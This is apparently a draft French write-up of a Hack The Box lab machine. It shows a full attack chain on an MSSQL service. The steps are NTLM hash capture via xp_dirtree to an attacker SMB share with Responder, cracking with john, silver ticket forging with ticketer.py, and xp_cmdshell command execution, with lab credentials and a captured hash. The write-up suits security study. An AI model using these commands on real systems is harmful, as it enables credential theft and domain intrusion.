+++
date = '2025-10-01T15:49:01Z'
draft = true
title = 'Silver ticket et Mssql'
+++

## Introduction

4eme machine devoilee lors de la saison 9, Signed est est box de difficultee moyenne et qui presente uniquement un service MSSQL.

## Enumeration

Un scan de port nous revele peu de choses, on retrouve un seul port ouvert sur la box (1433 /mssql). Un scan du /24 ne montre rien de plus.

```sh
$> nmap -Pn --top-ports=200 --open -oN nmap_top_ports 10.10.11.90
Nmap scan report for 10.10.11.90
Host is up (0.22s latency).
Not shown: 199 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
```

On a la chance d'avoir des creds fournis pour se connecter au service : `scott / Sm230#C5NatH`. Il y'a plusieurs outils a notre disposition. 
Je commence avec NetExec et son module mssql, avant de passer sur Impacket va nous permettre de s'y connecter plus facilement en utilisant *mssqlclient.py*. 
Ce script va nous permettre d'enumerer plus facilement plusieurs types d'infos (databases, droits, utilisateurs, etc.).

```bash
$> nxc mssql 10.10.11.90 -u scott -p 'Sm230#C5NatH' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
MSSQL MSSQL       10.10.11.90  1433   DC01             name:msdb
      10.10.11.90  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
MSSQL       10.10.11.90  1433   DC01             name:master
MSSQL       10.10.11.90  1433   DC01             name:tempdb
MSSQL       10.10.11.90  1433   DC01             name:model

$> nxc mssql 10.10.11.90 -u scott -p 'Sm230#C5NatH' --local-auth -q 'select * from sys.database_role_members;'                           ✔ 
MSSQL       10.10.11.90  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90  1433   DC01             [+] DC01\scott:Sm230#C5NatH 
MSSQL       10.10.11.90  1433   DC01             role_principal_id:16384
MSSQL       10.10.11.90  1433   DC01             member_principal_id:1

$> mssqlclient.py scott:'Sm230#C5NatH'@10.10.11.90`
[...]
SQL (scott  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1  
```

Apres enumeration, on peut lister des utilisateurs, une databse vide, et finalement rien de tres utile pour nous permettre d'aller plus loin.
En cherchant de la doc autours du service Mssql, je decouvre qu'il y'a plusieurs methodes d'exploitation connues (impersonation, linked server, ...), mais surtout qu'il est possible de recuperer un [hash ntlm](https://duckwrites.medium.com/capture-ntlm-hashes-with-mssql-an-essential-oscp-tip-0c2433a7815a).

L'article est payant, mais l'essentiel est visible. En fait via une interactoin entre le service mssql avec un share smb externe, on peut declencher une authentification NTLM et donc recuperer le hash du compte derriere, qui correspond au compte de service `mssqlsvc`.

```shell
# mssqlclient.py
SQL (scott  guest@master)> xp_dirtree \\10.10.14.48\toto
subdirectory   depth   file   
------------   -----   ----   

# Responder 
$> responder -I tun0
[...]
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:5055ee1204016348:D20CFE73F6986718F40155FA758DA599:010100000000000080FCF7005E3FDC016370F3FD2014763D000000000200080059004A003200520001001E00570049004E002D00380050003000480049003200360059004E005600580004003400570049004E002D00380050003000480049003200360059004E00560058002E0059004A00320052002E004C004F00430041004C000300140059004A00320052002E004C004F00430041004C000500140059004A00320052002E004C004F00430041004C000700080080FCF7005E3FDC01060004000200000008003000300000000000000000000000003000004459001D5150EBE722ABDC1409A0FEF40B5173024B99FB9653502CF33AC367EA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340038000000000000000000
```

Il est possible de bruteforcer ce hash pour recuperer le mot de passe du compte `mssqlsvc`. 
On va utiliser john (ou hashcat) et `rockyou` qui nous sortir immediatement le mot de passe *purPLE9795!@*

```bash
$> john --format=netntlmv2 --wordlist=./rockyou.txt ./hash.txt 
[...]
purPLE9795!@     (mssqlsvc)
```

Avec ce nouveau compte, on va pouvoir relancer une phase d'enumeration. 
On a toujours pas d'execution avec le module xp_cmdshell, mais on decouvre que le groupe *IT* possede des droits d'administration. 

```sql
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   ##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   
NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
[...]
scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   
SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   

```

On a maintenant assez d'informations pour passer a la partie suivante, avec notre gros cerveau on comprend tout de suite que la prochaine etape est de creer un silver ticket pour devenir admin sur ce service et *enfin* avoir les droits d'exec.

J'ajoute que meme si c'est dit simplement, ca m'a quand meme pris toute une aprem pour recuperer les deux flags :D.

## Silver Ticket et Shell

On peut retrouver plein d'exemples, notamment [hackndo](https://beta.hackndo.com/kerberos-silver-golden-tickets/#silver-ticket/), [the hacker recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver) et [adsecurity](https://adsecurity.org/?p=2011) qui sont mes references pour cette box.

>In order to craft a silver ticket, testers need to find the target service account's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by capturing an NTLM response (preferably NTLMv1) and cracking it, by dumping LSA secrets, by doing a DCSync, etc.

Donc, si on resume, on a besoin des infos suivantes :
    DOMAIN  - Bah le domaine
    SID     - La Sid du domaine  
    SPN     - Le service a exploiter
    NThash  - Le hash NT(mdp) du compte mssqlsvc


Pour la SID du domaine, on la retrouve via [sql suser_sid](https://learn.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver17)
```SQL
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\IT');
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   
```

Le service SQL garde une version en hexa, une IA nous indique qu'il faut la transfirmer en utilisant un script :D (dispo ici)[], ce qui nous donne finalement la sid correcte. En cadeau on a aussi l'identifiant du groupe (le 1105 a la fin).
```bash
$> python machin.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000 # groupe IT
'S-1-5-21-4088429403-1159899800-2753317549-1105'
```

Pour le hash NT, on utilise ce [service en ligne](https://www.browserling.com/tools/ntlm-hash) avec le mot de passe.
Et maintenant que toute est la, on peut creer le ticket, se connecter au service et enfin utiliser nos nouveaux droits. 
```bash
$> ticketer.py -nthash 'EF699384C3285C54128A3EE1DDB1A0CC' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain "SIGNED.HTB" -group 1105 -spn 'MSSQLSvc/DC01.SIGNED.HTB' mssqlsvc
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
$> export KRB5CCNAME=mssqlsvc.ccache
$> mssqlclient.py -k -no-pass -target-ip 10.10.11.90 -port 1433 dc01.signed.htb
$> SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell whoami
output            
---------------   
signed\mssqlsvc   
$> SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell type C:\Users\mssqlsvc\Desktop\user.txt
output                             
--------------------------------   
bbffa3e8f0555322...   
```

Dans le cas ou l'exec est toujours pas possible : 
```
$>enable_xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## Admin

Maintenant qu'on a de l'exec, on peut enfin recuperer un shell sur la machine pour aller plus loin.

